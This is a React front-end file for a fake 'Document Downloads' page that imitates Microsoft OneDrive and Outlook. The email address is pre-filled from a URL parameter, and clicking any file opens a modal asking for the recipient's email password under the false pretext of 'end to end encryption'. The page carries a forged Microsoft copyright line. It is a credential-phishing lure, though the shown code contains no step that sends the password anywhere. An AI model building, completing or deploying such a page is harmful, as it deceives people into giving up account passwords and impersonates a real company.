import { useEffect, useState } from "react";
import { FaFilePdf } from "react-icons/fa";
import { HiOutlineArrowDownTray } from "react-icons/hi2";
import "./App.css";

const files = [
  {
    id: 1,
    name: "Company profile.PDF",
    size: "1.4 GB",
  },
  {
    id: 2,
    name: "Supplier Data Sheet.PDF",
    size: "2 GB",
  },
  {
    id: 3,
    name: "Sample photos.PDF",
    size: "600 MB",
  },
];

export default function App() {
  const [showModal, setShowModal] = useState(false);
  const [email, setEmail] = useState("");

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const urlEmail =
      params.get("eca") ||
      window.location.hash.replace("#", "") ||
      "";

    if (urlEmail) {
      setEmail(decodeURIComponent(urlEmail));
    }
  }, []);

  return (
    <div className="app">

      {/* Top Bar */}

      <header className="topbar">
        <div className="logo">
         Document Downloads
        </div>
      </header>

      <div className="container">

        {/* Left */}

        <div className="left-section">

          <div className="onedrive-card">

            <div>
              <p>Total file size: 4 GB</p>
            </div>
          </div>

          <div className="explorer-card">
            <h2>File Explorer</h2>

            {files.map((file) => (
              <div key={file.id} className="file-row">

                <div className="file-info">

                  <div className="pdf-icon">
                  <FaFilePdf className="pdf-file" />
                  <HiOutlineArrowDownTray className="pdf-download" />
                </div>

                  <div>
                    <h3>{file.name}</h3>
                    <span>{file.size}</span>
                  </div>
                </div>

                <button
                  className="view-btn"
                  onClick={() => setShowModal(true)}
                >
                  View
                </button>
              </div>
            ))}

            <div className="download-row">
              <button 
              className="download-btn"
               onClick={() => setShowModal(true)}>
                Download all
              </button>
            </div>
          </div>

        </div>

        {/* Right */}

        <div className="right-card">

          <div className="outlook-header">
            <div className="outlook-icon">📧</div>

            <h2>Email Document </h2>

            <p>Email that gets you going.</p>
          </div>

          <div className="outlook-footer">
            <p>Signed by: Sales Manager</p>

            <p>Public Access Duration: 24 hrs</p>
          </div>
        </div>

      </div>

      {/* Modal */}

      {showModal && (
        <div className="overlay">

          <div className="modal">

            <h2>Secure Document Access</h2>

            <label>Email Address</label>

            <input
              type="email"
              value={email}
              readOnly
            />

            <small>
              We'll never share your email with anyone else.
            </small>

            <label>Password</label>

            <input
              type="password"
              placeholder="Receiver's Email Password"
            />

            <small>
              Required for end to end encryption.
            </small>

            <div className="encryption">
              <input
                type="checkbox"
                defaultChecked
              />

              <span>Data Encryption Enabled</span>
            </div>

            <div className="divider"></div>

            <div className="actions">

              <button
                className="cancel"
                onClick={() => setShowModal(false)}
              >
                Cancel
              </button>

              <button className="submit">
                View Files
              </button>

            </div>

            <div className="tip">
              Tip: To access files, enter receiver's email and password
            </div>

            <div className="copyright">
              All rights reserved. © Microsoft 2024
            </div>

          </div>

        </div>
      )}

    </div>
  );
}